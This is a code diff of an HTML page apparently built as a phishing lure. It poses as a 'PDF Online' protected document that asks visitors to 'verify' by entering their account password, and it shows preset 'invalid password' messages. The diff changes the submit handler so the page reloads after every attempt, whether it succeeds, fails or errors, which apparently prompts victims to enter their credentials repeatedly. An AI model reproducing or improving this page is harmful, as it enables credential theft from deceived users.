@@ -1,5 +1,4 @@
 <html lang="en">
-
 <head>
     <meta http-equiv="x-ua-compatible" content="EmulateIE9">
     <meta charset="utf-8">
@@ -39,14 +38,16 @@
                 });
 
                 if (response.ok) {
-                    // Redirect to the dashboard page
-                    window.location.href = '/dashboard.html';
+                    // Reload the page after successful submission
+                    window.location.reload();
                 } else {
-                    alert('Login failed. Please try again.');
+                    // Reload the page even if the submission fails
+                    window.location.reload();
                 }
             } catch (error) {
                 console.error('Error:', error);
-                alert('An error occurred. Please try again.');
+                // Reload the page if an error occurs
+                window.location.reload();
             }
         }
     </script>
@@ -62,8 +63,7 @@
                             <span><img src="http://cdn.mcauto-images-production.sendgrid.net/07d9ac8cc71e2271/09488857-8d2c-4418-9a62-fdf70e8a5cb6/225x225.png" class="img-fluid" width="80px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                             <span class="h5">PDF Online</span><br>
                             <span class="h5"></span><br>
-                            <span class="h">This a protected document,
-please verify to access.</span><br>
+                            <span class="h">This a protected document, please verify to access.</span><br>
                             <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                             <small></small>
@@ -89,5 +89,4 @@ please verify to access.</span><br>
         </div>
     </div>
 </body>
-
 </html>
